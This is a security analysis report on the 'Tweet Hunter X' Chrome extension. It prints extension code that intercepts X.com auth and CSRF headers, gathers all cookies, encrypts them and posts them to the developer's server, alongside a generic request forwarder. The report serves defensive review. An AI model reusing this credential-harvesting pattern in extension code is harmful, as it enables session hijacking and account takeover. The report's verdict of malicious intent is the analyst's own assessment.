# Security Analysis: Tweet Hunter X: Sidebar for X (amoldiondpmjdnllknhklocndiibkcoe)

## Extension Metadata
- **Name**: Tweet Hunter X: Sidebar for X
- **Extension ID**: amoldiondpmjdnllknhklocndiibkcoe
- **Version**: 1.15.11
- **Manifest Version**: 3
- **Estimated Users**: ~40,000
- **Developer**: Tweet Hunter / Twemex (tweethunter.io)
- **Analysis Date**: 2026-02-15

## Executive Summary
Tweet Hunter X is a **HIGH RISK** extension that exfiltrates sensitive Twitter/X user credentials and session data to third-party servers operated by the developer. The extension intercepts authentication headers (OAuth tokens, CSRF tokens), extracts all X.com cookies, and transmits this data to external endpoints with AES encryption to obscure the content. While the extension provides legitimate Twitter enhancement features (sidebar, tweet search, analytics), the credential harvesting and unauthorized API access constitute serious security violations.

**Overall Risk Assessment: HIGH**

**Critical Findings:**
1. **Credential Theft**: Intercepts and exfiltrates Twitter OAuth authorization tokens, CSRF tokens, and session cookies
2. **Session Hijacking**: Sends encrypted authentication data that could enable account takeover
3. **Unauthorized Third-Party API Access**: Uses stolen credentials to make Twitter API calls through developer's Firebase Cloud Functions
4. **Data Obfuscation**: Employs AES encryption to hide exfiltrated credentials from network monitoring

---

## Vulnerability Assessment

### 1. Twitter Credential Interception and Exfiltration (CRITICAL)
**Severity**: CRITICAL
**Files**:
- `/dist/background.js` (lines 4130-4158)
- `/dist/content.js` (lines 36452-36479)

**Analysis**:
The extension uses `webRequest.onSendHeaders` to intercept all outgoing requests to `api.x.com` and extract authentication headers including OAuth tokens and CSRF tokens. This data is then transmitted to the developer's server.

**Code Evidence** (`background.js`):
```javascript
var cn = n => {
  chrome.webRequest.onSendHeaders.addListener(e => {
    if (x0(`running authHeadersListener registered from ${n}`), e.url.includes("adaptive")) return;
    let m = e.requestHeaders;
    if (x0("intercepted headers", m), m.find(l => l.name.toLowerCase() === "authorization") && m.find(l => l.name.toLowerCase() === "x-csrf-token")) {
      x0("found matching auth headers");
      let l = {
        authorization: m.find(H => H.name.toLowerCase() === "authorization").value,
        csrfToken: m.find(H => H.name.toLowerCase() === "x-csrf-token").value,
        userAgent: m.find(H => H.name.toLowerCase() === "user-agent").value
      };
      (!S0 || l.authorization !== S0.authorization || l.csrfToken !== S0.csrfToken || l.userAgent !== S0.userAgent) && (x0("new auth headers", "old", S0, "new", l), S0 = l, chrome.tabs.query({
        url: "*://x.com/*"
      }, H => {
        H.forEach(b => {
          x0("sending message to tab", b.id), chrome.tabs.sendMessage(b.id, {
            message: "authHeadersChanged",
            authHeaders: S0
          })
        })
      }))
    }
  }, {
    urls: ["*://api.x.com/*"],
    types: ["xmlhttprequest"]
  }, ["requestHeaders"])
};
```

**Exfiltration Endpoint** (`content.js` line 36454-36476):
```javascript
let I = async () => {
  try {
    chrome.runtime.sendMessage({
      message: "getCookies"
    }, q => {
      if (!q || q.length === 0) return;
      let X = q.map(G => `${G.name}=${G.value}`).join("; "),
        P = {
          authorization: ze(n.authorization, S.twUserName),
          csrfToken: ze(n.csrfToken, S.twUserName),
          userAgent: ze(n.userAgent, S.twUserName),
          cookies: ze(X, S.twUserName),
          idAccount: S.id
        };
      chrome.runtime.sendMessage({
        method: "POST",
        url: "https://app.tweethunter.io/api/saveTwitterHeaders",
        headers: {
          "Content-Type": "application/json"
        },
        payload: P
      }, function(G) {
        G.success && A(!0)
      })
    })
  } catch (q) {
    console.error("Failed to save: ", q)
  }
}
```

**Data Encrypted Before Transmission** (`content.js` line 29535-29537):
```javascript
function ze(t, e) {
  return hq.AES.encrypt(t, e).toString()
}
```

**Data Harvested:**
- Twitter OAuth `Authorization` header (full bearer token)
- `x-csrf-token` (CSRF protection token)
- `User-Agent` string
- All X.com cookies (serialized as cookie string)
- Twitter account ID

**Destination**: `https://app.tweethunter.io/api/saveTwitterHeaders`

**Security Impact:**
- **Account Takeover Risk**: OAuth tokens and CSRF tokens are sufficient to perform any action as the authenticated user
- **Session Hijacking**: Cookies enable complete session impersonation
- **Persistent Access**: Tokens may have extended validity, allowing prolonged unauthorized access
- **Encryption Obfuscation**: AES encryption using Twitter username as key conceals credential theft from network monitoring

**Verdict**: **CRITICAL VULNERABILITY** - Unauthorized credential harvesting with obfuscation

---

### 2. Cookie Extraction via Privileged API (HIGH)
**Severity**: HIGH
**Files**: `/dist/background.js` (lines 4174-4178)

**Analysis**:
The background script provides a message handler that extracts all cookies for the `x.com` domain using the privileged `chrome.cookies.getAll` API and returns them to content scripts.

**Code Evidence**:
```javascript
if (n.message === "getCookies") return chrome.cookies.getAll({
  domain: "x.com"
}, l => {
  m(l)
}), !0;
```

**Cookie Data Transmitted**:
All X.com cookies are serialized into a single cookie string (`name=value; name2=value2; ...`) and sent to `app.tweethunter.io` after AES encryption.

**Security Impact:**
- Exposes session cookies that could be used to bypass login
- Violates user privacy expectations
- Cookies combined with auth headers enable full account impersonation

**Verdict**: **HIGH SEVERITY** - Unauthorized cookie harvesting via privileged API

---

### 3. Unauthorized Third-Party API Proxy (HIGH)
**Severity**: HIGH
**Files**:
- `/dist/content.js` (lines 30943, 31183, 31254, 31437, 31923)
- `/dist/background.js` (lines 4182-4215)

**Analysis**:
The extension proxies Twitter API requests through the developer's Firebase Cloud Functions (`us-central1-ez4cast.cloudfunctions.net`) instead of calling `api.x.com` directly. This allows the developer to log, analyze, or modify all Twitter API responses.

**Code Evidence** (`content.js` line 30943):
```javascript
e1 = await (await fetch(`https://us-central1-ez4cast.cloudfunctions.net/twitterFetcher-searchAllTweetsForExtension?${Q.toString()}`)).json();
```

**Additional Proxy Endpoints:**
- `https://us-central1-ez4cast.cloudfunctions.net/twitterFetcher-searchAllTweetsForExtension` (search queries)
- `https://us-central1-ez4cast.cloudfunctions.net/twitterFetcher-push` (tweet data uploads)
- `https://us-central1-ez4cast.cloudfunctions.net/tweetChampions-twemexGetAllTimeHighLights` (user highlights)

**Background Script Generic Forwarder** (`background.js` line 4198-4215):
```javascript
if (n.method === "POST" && n.url && n.payload) return fetch(n.url, {
  method: "POST",
  body: JSON.stringify(n.payload),
  [n.headers ? "headers" : ""]: n.headers,
  [n.mode ? "mode" : ""]: n.mode,
  [n.credentials ? "credentials" : ""]: n.credentials
}).then(l => l.json()).then(l => {
  l.success ? m({
    success: 1,
    data: l
  }) : m({
    success: 0,
    error: l.error
  })
}).catch(l => m({
  success: 0,
  error: l.message
})), !0
```

**Data Sent Through Proxy:**
- Twitter search queries (user search terms)
- Tweet content and metadata
- User profile information
- Timeline data

**Security Impact:**
- Developer has full visibility into user's Twitter activity
- Violates user privacy by routing data through third-party infrastructure
- Creates man-in-the-middle position for Twitter API calls
- Potential for data collection, profiling, or resale

**Verdict**: **HIGH SEVERITY** - Unauthorized third-party API interception

---

### 4. Tweet Data Upload to External Server (MEDIUM)
**Severity**: MEDIUM
**Files**: `/dist/content.js` (lines 30715-30728)

**Analysis**:
The extension uploads tweet objects to the developer's Firebase endpoint without explicit user consent.

**Code Evidence**:
```javascript
let e = {
  type: "tweet",
  tweets: t
};
chrome.runtime.sendMessage({
  method: "POST",
  url: "https://us-central1-ez4cast.cloudfunctions.net/twitterFetcher-push",
  headers: {
    "Content-Type": "application/json"
  },
  payload: e
})
```

**Data Uploaded:**
- Full tweet objects including text, author information, metadata
- User interactions with tweets (saves, bookmarks triggered this function)

**Destination**: `https://us-central1-ez4cast.cloudfunctions.net/twitterFetcher-push`

**Security Impact:**
- User's Twitter reading/interaction patterns tracked by third party
- Tweet content harvested for potential analytics or training data
- Privacy violation without clear disclosure

**Verdict**: **MEDIUM SEVERITY** - Unauthorized data collection

---

### 5. OAuth Token Handling for Tweet Hunter Service (HIGH)
**Severity**: HIGH
**Files**: `/dist/content.js` (line 32490)

**Analysis**:
The extension stores and manages Twitter OAuth access tokens and secret tokens for integration with the Tweet Hunter service, including both read and write access tokens.

**Code Evidence**:
```javascript
function yc(t, e) {
  t && (e?.thWriteAccessToken ? (t.twAccessToken = e?.thWriteAccessToken, t.twSecretToken = e?.thWriteSecretToken, t.thApp = e?.thApp ?? "", t.app = e?.thApp ?? "", t.tokenType = "write") : e?.thReadAccessToken && (t.twAccessToken = e?.thReadAccessToken, t.twSecretToken = e?.thReadSecretToken, t.app = e?.thReadApp ?? "T_TWEETHUNTER", t.tokenType = "read"))
}
```

**Token Types Managed:**
- `thWriteAccessToken` / `thWriteSecretToken` (write permissions)
- `thReadAccessToken` / `thReadSecretToken` (read permissions)

**Security Impact:**
- Write tokens allow posting tweets, DMs, or other actions on user's behalf
- Tokens stored in extension could be accessed if extension is compromised
- Unclear token scope and permissions granted

**Verdict**: **HIGH SEVERITY** - Risky OAuth token management

---

## Network Analysis

### External Domains Contacted

1. **app.tweethunter.io**
   - Purpose: Credential storage, session management, OAuth token exchange
   - Endpoints:
     - `/api/saveTwitterHeaders` - Receives encrypted auth headers and cookies
     - `/api/auth/getSession` - Session validation
     - `/api/auth/getToken` - OAuth token exchange
   - Data Sensitivity: **CRITICAL** (receives stolen credentials)

2. **auth.tweethunter.io**
   - Purpose: Authentication flows
   - Referenced in background script for tab monitoring

3. **us-central1-ez4cast.cloudfunctions.net**
   - Purpose: Firebase Cloud Functions proxy for Twitter API
   - Endpoints:
     - `/twitterFetcher-searchAllTweetsForExtension` - Twitter search proxy
     - `/twitterFetcher-push` - Tweet data uploads
     - `/tweetChampions-twemexGetAllTimeHighLights` - User highlight data
   - Data Sensitivity: **HIGH** (receives user activity and Twitter data)

4. **api.x.com**
   - Purpose: Official Twitter/X API (monitored, not directly contacted for some features)
   - Intercepted for credential harvesting

### Traffic Analysis
- **Encryption**: Credentials encrypted with AES using Twitter username as key before transmission
- **HTTPS**: All external communications use HTTPS
- **Headers**: Properly formatted HTTP headers with Content-Type application/json
- **Credentials Mode**: Uses `include` mode for cross-origin credential inclusion

---

## Permission Analysis

### Declared Permissions

1. **webRequest** (HIGH RISK)
   - Used to intercept HTTP headers from `api.x.com` requests
   - Enables passive monitoring of all X.com API traffic
   - **Abuse**: Harvests OAuth tokens and CSRF tokens

2. **storage**
   - Used for caching search results and user preferences
   - **Legitimate Use**: Extension settings and data caching

3. **cookies** (HIGH RISK)
   - Used to extract all X.com domain cookies
   - **Abuse**: Full cookie extraction sent to remote server

### Host Permissions

1. **https://x.com/**
   - Required for content script injection
   - Legitimate for extension functionality

2. **https://api.x.com/**
   - Required for webRequest header interception
   - **Abuse**: Used to steal authentication credentials

### Risk Assessment
- **Excessive Permissions**: `webRequest` and `cookies` permissions enable credential theft
- **Privilege Escalation**: Background script acts as universal forwarder for arbitrary POST requests
- **No Clear Justification**: Credential harvesting not disclosed in extension description

---

## Data Flow Summary

### Credential Theft Flow
1. User visits X.com and makes API request (e.g., loading timeline)
2. Background script intercepts request headers via `webRequest.onSendHeaders`
3. Extracts `Authorization` (OAuth bearer token) and `x-csrf-token`
4. Stores tokens in variable `S0` and broadcasts to content scripts
5. Content script receives auth headers via `authHeadersChanged` message
6. Content script requests all X.com cookies via `getCookies` message
7. Background script returns full cookie array using `chrome.cookies.getAll`
8. Content script serializes cookies to string
9. Content script encrypts auth headers, CSRF token, user-agent, and cookies using AES with Twitter username as key
10. Encrypted payload sent via POST to `https://app.tweethunter.io/api/saveTwitterHeaders`

### Third-Party API Proxy Flow
1. User searches tweets in extension sidebar
2. Extension builds Twitter API query parameters
3. Instead of calling `api.x.com` directly, calls `us-central1-ez4cast.cloudfunctions.net/twitterFetcher-searchAllTweetsForExtension`
4. Developer's Firebase function receives query, likely forwards to Twitter API with their credentials
5. Response returned to extension and displayed to user
6. Developer retains logs of all user search queries

---

## Recommendations

### For Users
1. **UNINSTALL IMMEDIATELY** - This extension poses significant account security risks
2. **Revoke Twitter Sessions**: Log out of X.com and revoke all active sessions
3. **Change Password**: Change X.com password to invalidate stolen session tokens
4. **Review Connected Apps**: Check X.com settings for unauthorized OAuth applications and revoke access
5. **Monitor Account Activity**: Review recent tweets, DMs, and account actions for unauthorized activity

### For Chrome Web Store
1. **Remove Extension**: Immediate takedown recommended for ToS violations:
   - Credential theft (OAuth tokens, CSRF tokens, cookies)
   - Undisclosed data exfiltration
   - Session hijacking capability
   - Privacy policy violations (AES obfuscation of transmitted data)
2. **Developer Ban**: Consider banning developer account for malicious behavior
3. **User Notification**: Alert existing users to uninstall and secure their accounts

### For Developers (General Guidance)
1. Never intercept or transmit user authentication credentials
2. Disclose all data collection and transmission in privacy policy
3. Use Twitter's official OAuth flow for authorized API access
4. Do not proxy API calls through third-party infrastructure without disclosure
5. Avoid encryption to obscure data transmissions from security audits

---

## Risk Verdict

**OVERALL RISK LEVEL: HIGH**

**Vulnerability Summary:**
- **Critical**: 1 (Credential theft with encryption obfuscation)
- **High**: 3 (Cookie extraction, third-party API proxy, OAuth token handling)
- **Medium**: 1 (Tweet data upload)
- **Low**: 0

**Justification:**
This extension exhibits clear malicious intent by:
1. Intercepting and exfiltrating authentication credentials without disclosure
2. Using AES encryption to hide stolen data from network monitoring
3. Routing user data through third-party infrastructure for collection
4. Enabling potential account takeover via stolen OAuth tokens and session cookies

While the extension provides legitimate Twitter enhancement features, the undisclosed credential harvesting and data exfiltration constitute serious security violations that justify classification as **HIGH RISK** malware.

**Recommendation**: Immediate removal from Chrome Web Store and user notification for uninstallation.
